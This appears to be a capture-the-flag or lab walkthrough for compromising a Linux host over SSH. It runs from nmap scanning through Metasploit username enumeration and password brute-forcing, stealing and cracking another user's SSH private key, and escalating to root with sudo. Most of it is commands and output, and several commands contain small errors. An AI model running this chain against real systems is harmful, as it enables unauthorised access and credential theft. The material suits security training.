# STEP 1: Scanning

Scan the host and identify that SSH is running and the version of it.

```
nmap -sS -sV -sC -p- -oN nmap_full_scan <targetIP>
```

 -sS => Stealth Scan 
 -sV => Service Scan 
 -sC => default script scan 
 -p- => All ports 
 -oN => Output file

If you have the version of SSH, check is there is a vulnerability or exploit for it:
Example:
```
searchsploit openssh 2
```

# STEP 2: Enumerate

You can run:
```
enum4linux <targetIP>
```

See if you can find any usernames on the host.
Save them down so that we can try and crack them later.

If there is a vulnerability on SSH, you can try and do username enumeration and password cracking by doing the following:

If you know the first letter of a name, you can narrow the username list down by only that first letter. Let's say we know the name starts with the letter "J"
Create a username file by doing the following:
Download SecLists:
```
git clone https://github.com/danielmiessler/SecLists/tree/master
```

Now generate a username file using the wordlist of names that only start with the letter "J"
```
cat IntruderPayloads/Repositories/SecLists/Username/Names/names.txt | grep -i "^[j]" > /root/names-j.txt
```

Now lets enumerate the username(s):
```
msfconsole -q 
search openssh
use auxiliary/scanner/ssh/ssh_enumusers 
set RHOST
set USER_FILE /root/names-j.txt
```

Once you go the username(s), you can now try to crack the password for the username(s):
In this example the username is "jan"
Still in Metaspoit:
```
search ssh
```
Look for a ssh or ssh_login

We will use the following details:
Username: jan
Password file located at: /root/Lists/SecLists/Passwords/Common-Credentials/darkweb2017_top-10000.txt

Now use it:
```
use auxiliary/scanner/ssh/ssh_login
show options
set RHOST <targetIP>
set USERNAME jan
set verbose 1 # Optional: Will print output for all attempts
set pass_file /root/Lists/SecLists/Passwords/Common-Credentials/darkweb2017_top-10000.txt
run
```

If it finds a password, the output will be something like this:
```
[+] 10.50.10.53:22        - Success: 'jan:armando' 'uid=1001(jan) gid=1001(jan) groups=1001(jan) Linux basic2 4.4.0-119-generic #143-Ubuntu SMP Mon Apr 2 16:08:24 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (10.50.10.254:37757 -> 10.50.10.53:22) at 2026-05-24 19:11:23 +0200
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Metasploit will try to establish a session. To view the sessions, simply type in sessions
```
sessions
```

To connect to the sessions, type the following command and the sessions ID/number:
```
sessions 1
```

Once connected, you might not see anything, try typing in the following to confirm you are connected:
```
whoami
id
```


To get a better shell, type in the following command:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

You should now see a shell.

# Privilege Escalation

See what executing permissions you ahve on the box:
```
find / -perm 4000 2>/dev/null
```

If you have something like VIM, you might be able to read some files using vi editor.

Visit the "/home" directory and see if there anre any other users. See if you can access their .ssh folders.

```
cd .. 
cd <otherUsername> 
```

ls Anything interesting? cd .ssh can you cat the SSH private key?
cat the file and copy the contents.

Use the id_rsa Key to ssh First you need to change the permissions on it: 
```
chmod 700 id_rsa # (Or whatever you called it.) 
```
now ssh using the key: 
```
ssh kay@<targetIP> -i id_rsa
```

If it asks for a password, follow the steps below (Relationship)

On Kali, try to crack the key using John the Ripper 
```
ssh2john <KeyFileYouCopied> > sshkey
```
Now try to crack it 
```
john sshkey --wordlist=/usr/share/wordlists/rockyou.txt
```

Found key Password.
On the box that you managed to gain access to and in the home folder of the user you want to hack, use the private key to ssh to the local box ausing the SSH private key and the password you cracked. 
```
/home/kay/.ssh/ ssh -i id_rsa kay@localhost
```
Log in with the password. In this example, the SU password is saved in pass.bak Try running:
```
sudo su
```

OR 
```
sudo -l
```

To see what sudo permissions the user has.
and paste the password You should have root access now


